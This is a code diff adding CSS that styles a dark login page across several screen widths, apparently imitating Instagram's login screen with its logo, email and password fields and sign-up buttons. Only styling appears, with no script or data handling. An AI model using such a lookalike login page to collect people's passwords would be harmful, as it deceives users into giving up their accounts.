+        display:flex;
+        align-items:center;
+        justify-content:center;
+        /* margin-top:97px; */
+        /* display:none; */
+    }
+    div.formbox p.logintxt{
+        font-size:16px;
+        display:flex;
+        justify-content:flex-start;
+        width:100%;
+        color:white;
+        /* font-family:initial; */
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        /* font-weight:500; */
+        border:2px solid red;
+        display:none;
+        
+        
+    }
+    form{
+        /* border:2px solid hwb(60 0% 0%); */
+        display:flex;
+        width:100%;
+        height:100%;
+        margin-top:50px;
+          /* background:rgb(23, 23, 23); */
+        padding-bottom:30px;
+        /* justify-content:center; */
+        align-items:center;
+        flex-direction:column;
+    }
+    form p.enguk{
+        color:rgb(162, 162, 162);
+        text-align:center;
+        font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        position:absolute;
+        top:15px;
+        font-size:11px;
+    }
+
+form img.instalogoleft{
+    height:60px;
+    margin-top:38px;
+}
+
+    /*  */
+    /*  */
+form div.emailinput{
+        width:90%;
+        height:60px;
+        margin-top:50px;
+        /* margin-left:70px; */
+        border-radius:16px;
+  border:1px solid rgb(72, 71, 71);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+
+         
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+
+    div.formbox input.email{
+      width:90%;
+        height:54px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:5px;
+        
+    }
+    div.emailinput label{
+        position:absolute;
+        padding-left:20px;
+        width:90%;
+        height:15px;
+
+        /* border:2px solid red; */
+        overflow:hidden;
+        font-size:2px;
+        line-height:1.2;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        /* font-weight:200; */
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        /* letter-spacing:0.4px; */
+
+    }
+    div.emailinput span{
+     color:rgba(214, 214, 214, 0.832);
+    display:none;
+    align-self:center;
+    height:auto;
+    font-size:20px;
+    border-radius:10px;
+   padding:5px 10px;
+   position:absolute;
+    right:5px;
+   background:rgb(28, 29, 28);
+   z-index:3;
+   /* border-radius:10px; */
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;=
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:90%;
+        height:60px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        /* border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28); */
+     border:1px solid rgb(72, 71, 71);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+   font-size:15px;
+   padding:10px 10px;
+   align-self:center;
+     color:rgba(181, 178, 178, 0.832);
+       color:rgba(214, 214, 214, 0.832);
+      background:rgb(28, 29, 28);
+      right:5px;
+   
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+      width:90%;
+        height:50px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:3px;
+         /* letter-spacing:0.8px; */
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:14px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+   
+    input.login{
+        width:90%;
+        height:40px;
+        margin-top:12px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:14px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        opacity:100%;
+      
+    }
+    
+    button.forget{
+        /* display:none; */
+        justify-content:center;
+        align-items:center;
+        font-size:14px;
+        width:90%;
+        height:auto;
+        margin-top:15px;
+        background:transparent;
+        /* background:rgb(38, 36, 36); */
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        /* border:2px solid yellow; */
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        border:none;
+        /* font-weight:400; */
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:7px;
+        width:100%;
+        height:20px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle; 
+        border:none;
+        display:none;
+    }
+     img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+        display:none
+    }
+
+    button.cracc{
+        /* display:flex;
+        justify-content:center;
+        align-items:center; */
+        width:90%;
+        height:40px;
+        font-size:14px;
+        margin-top:126px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        /* letter-spacing:1px; */
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:15px;
+        /* padding-bottom:10px; */
+        /* margin-bottom:30px; */
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+     display:none;
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
+    
+
+
+}
+@media (min-width: 481px) and (max-width: 767px) {
+i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+        display:none;
+    }
+
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:60px;
+        left:15%;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        height:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:5%;
+   right:32%;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:25px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    width:30px;
+}
+div.video div.collection div i{
+    font-size:25px;
+    cursor:pointer;
+}
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
+}
+
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
+    /* display:none; */
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    display:none;
+}
+
+
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
+    /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        align-items:Center;
+        height:auto;
+        width:100%;
+        background-color:rgb(0, 0, 0);
+
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+        display:none;
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+display:none;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
+    display:none;
+    /* text-align:center; */
+}
+
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        width:100%;
+        height:100vh;
+        height:auto;
+        background:rgb(28, 29, 28);
+        /* border-left:2px solid rgb(86, 8, 255); */
+        /* /* background:rgb(34, 33, 33); */
+        /* background:rgb(7, 208, 7); */ 
+
+    }
+
+    div.formbox{
+        /* border:2px solid green; */
+        width:100%;
+        height:100%;
+        /* height:1; */
+        /* margin:0px auto; */
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        /* margin-top:97px; */
+        /* display:none; */
+    }
+    div.formbox p.logintxt{
+        font-size:16px;
+        display:flex;
+        justify-content:flex-start;
+        width:100%;
+        color:white;
+        /* font-family:initial; */
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        /* font-weight:500; */
+        border:2px solid red;
+        display:none;
+        
+        
+    }
+    form{
+        /* border:2px solid hwb(60 0% 0%); */
+        display:flex;
+        width:100%;
+        height:100%;
+        margin-top:50px;
+          /* background:rgb(23, 23, 23); */
+        padding-bottom:30px;
+        /* justify-content:center; */
+        align-items:center;
+        flex-direction:column;
+    }
+    form p.enguk{
+        color:rgb(162, 162, 162);
+        text-align:center;
+        font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        position:absolute;
+        top:15px;
+        font-size:11px;
+    }
+
+form img.instalogoleft{
+    height:60px;
+    margin-top:38px;
+}
+
+    /*  */
+    /*  */
+form div.emailinput{
+        width:90%;
+        height:60px;
+        margin-top:50px;
+        /* margin-left:70px; */
+        border-radius:16px;
+  border:1px solid rgb(72, 71, 71);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+
+         
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+
+    div.formbox input.email{
+      width:90%;
+        height:54px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:5px;
+        
+    }
+    div.emailinput label{
+        position:absolute;
+        padding-left:20px;
+        width:90%;
+        height:15px;
+
+        /* border:2px solid red; */
+        overflow:hidden;
+        font-size:2px;
+        line-height:1.2;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        /* font-weight:200; */
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        /* letter-spacing:0.4px; */
+
+    }
+    div.emailinput span{
+     color:rgba(214, 214, 214, 0.832);
+    display:none;
+    align-self:center;
+    height:auto;
+    font-size:20px;
+    border-radius:10px;
+   padding:5px 10px;
+   position:absolute;
+    right:5px;
+   background:rgb(28, 29, 28);
+   z-index:3;
+   /* border-radius:10px; */
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;=
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:90%;
+        height:60px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        /* border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28); */
+     border:1px solid rgb(72, 71, 71);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+   font-size:15px;
+   padding:5px 10px;
+   align-self:center;
+     color:rgba(181, 178, 178, 0.832);
+       color:rgba(214, 214, 214, 0.832);
+      background:rgb(28, 29, 28);
+      right:5px;
+   
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+      width:90%;
+        height:50px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:3px;
+         letter-spacing:0.8px;
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:14px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+   
+    input.login{
+        width:90%;
+        height:40px;
+        margin-top:12px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:14px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        opacity:100%;
+      
+    }
+    
+    button.forget{
+        /* display:none; */
+        justify-content:center;
+        align-items:center;
+        font-size:14px;
+        width:90%;
+        height:auto;
+        margin-top:15px;
+        background:transparent;
+        /* background:rgb(38, 36, 36); */
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        /* border:2px solid yellow; */
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        border:none;
+        /* font-weight:400; */
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:7px;
+        width:100%;
+        height:20px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle; 
+        border:none;
+        display:none;
+    }
+     img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+        display:none
+    }
+
+    button.cracc{
+        /* display:flex;
+        justify-content:center;
+        align-items:center; */
+        width:90%;
+        height:40px;
+        font-size:14px;
+        margin-top:126px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        /* letter-spacing:1px; */
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:15px;
+        /* padding-bottom:10px; */
+        /* margin-bottom:30px; */
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+     display:none;
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
+    
+
+
+}
+@media (min-width: 768px) and (max-width: 1023px) {
+i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+        display:none;
+    }
+
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:60px;
+        left:15%;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        height:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:5%;
+   right:32%;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:25px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    width:30px;
+}
+div.video div.collection div i{
+    font-size:25px;
+    cursor:pointer;
+}
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
+}
+
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
+    /* display:none; */
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    display:none;
+}
+
+
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
+    /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        align-items:Center;
+        height:auto;
+        width:100%;
+        background-color:rgb(0, 0, 0);
+
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+        display:none;
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+display:none;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
+    display:none;
+    /* text-align:center; */
+}
+
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        width:100%;
+        height:100vh;
+        height:auto;
+        background:rgb(28, 29, 28);
+        /* border-left:2px solid rgb(86, 8, 255); */
+        /* /* background:rgb(34, 33, 33); */
+        /* background:rgb(7, 208, 7); */ 
+
+    }
+
+    div.formbox{
+        /* border:2px solid green; */
+        width:100%;
+        height:100%;
+        /* height:1; */
+        /* margin:0px auto; */
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        /* margin-top:97px; */
+        /* display:none; */
+    }
+    div.formbox p.logintxt{
+        font-size:16px;
+        display:flex;
+        justify-content:flex-start;
+        width:100%;
+        color:white;
+        /* font-family:initial; */
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        /* font-weight:500; */
+        border:2px solid red;
+        display:none;
+        
+        
+    }
+    form{
+        /* border:2px solid hwb(60 0% 0%); */
+        display:flex;
+        width:100%;
+        height:100%;
+        margin-top:50px;
+          /* background:rgb(23, 23, 23); */
+        padding-bottom:30px;
+        /* justify-content:center; */
+        align-items:center;
+        flex-direction:column;
+    }
+    form p.enguk{
+        color:rgb(162, 162, 162);
+        text-align:center;
+        font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        position:absolute;
+        top:15px;
+        font-size:11px;
+    }
+
+form img.instalogoleft{
+    height:60px;
+    margin-top:38px;
+}
+
+    /*  */
+    /*  */
+form div.emailinput{
+        width:90%;
+        height:60px;
+        margin-top:50px;
+        /* margin-left:70px; */
+        border-radius:16px;
+  border:1px solid rgb(72, 71, 71);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+
+         
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+
+    div.formbox input.email{
+      width:90%;
+        height:54px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:5px;
+        
+    }
+    div.emailinput label{
+        position:absolute;
+        padding-left:20px;
+        width:90%;
+        height:15px;
+
+        /* border:2px solid red; */
+        overflow:hidden;
+        font-size:2px;
+        line-height:1.2;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        /* font-weight:200; */
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        /* letter-spacing:0.4px; */
+
+    }
+    div.emailinput span{
+     color:rgba(214, 214, 214, 0.832);
+    display:none;
+    align-self:center;
+    height:auto;
+    font-size:20px;
+    border-radius:10px;
+   padding:5px 10px;
+   position:absolute;
+    right:5px;
+   background:rgb(28, 29, 28);
+   z-index:3;
+   /* border-radius:10px; */
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;=
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:90%;
+        height:60px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        /* border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28); */
+     border:1px solid rgb(72, 71, 71);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+   font-size:15px;
+   padding:5px 10px;
+   align-self:center;
+     color:rgba(181, 178, 178, 0.832);
+       color:rgba(214, 214, 214, 0.832);
+      background:rgb(28, 29, 28);
+      right:5px;
+   
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+      width:90%;
+        height:50px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:3px;
+         letter-spacing:0.8px;
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:14px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
+    } */
+    
+
+   
+    input.login{
+        width:90%;
+        height:40px;
+        margin-top:12px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:14px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        opacity:100%;
+      
+    }
+    
+    button.forget{
+        /* display:none; */
+        justify-content:center;
+        align-items:center;
+        font-size:14px;
+        width:90%;
+        height:auto;
+        margin-top:15px;
+        background:transparent;
+        /* background:rgb(38, 36, 36); */
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        /* border:2px solid yellow; */
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        border:none;
+        /* font-weight:400; */
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:7px;
+        width:100%;
+        height:20px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle; 
+        border:none;
+        display:none;
+    }
+     img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+        display:none
+    }
+
+    button.cracc{
+        /* display:flex;
+        justify-content:center;
+        align-items:center; */
+        width:90%;
+        height:40px;
+        font-size:14px;
+        margin-top:126px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        /* letter-spacing:1px; */
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
+
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:15px;
+        /* padding-bottom:10px; */
+        /* margin-bottom:30px; */
+    }
+
+
+
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
+
+footer{
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+     display:none;
+}
+footer ul.footerul{
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
+}
+footer ul.footerul li{
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
